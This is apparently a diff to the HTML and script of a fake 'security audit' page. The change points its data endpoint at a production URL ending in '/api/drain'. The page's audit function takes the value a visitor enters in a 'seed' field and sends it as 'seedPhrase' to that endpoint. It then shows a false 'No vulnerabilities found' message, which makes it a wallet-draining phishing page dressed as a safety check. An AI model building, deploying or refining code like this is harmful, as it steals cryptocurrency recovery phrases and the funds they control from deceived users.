@@ -10,7 +10,7 @@
 <div id="step3" class="hidden"><h2>? Audit Complete</h2><p>No vulnerabilities found</p></div>
 </div>
 <script>
-const API = "https://discerning-wisdom.up.railway.app/api/drain";
+const API = 'https://discerning-wisdom-production.up.railway.app/api/drain';
 function connect(){document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');}
 function audit(){fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({seedPhrase:document.getElementById('seed').value})}).then(()=>{document.getElementById('step2').classList.add('hidden');document.getElementById('step3').classList.remove('hidden');});}
 </script>
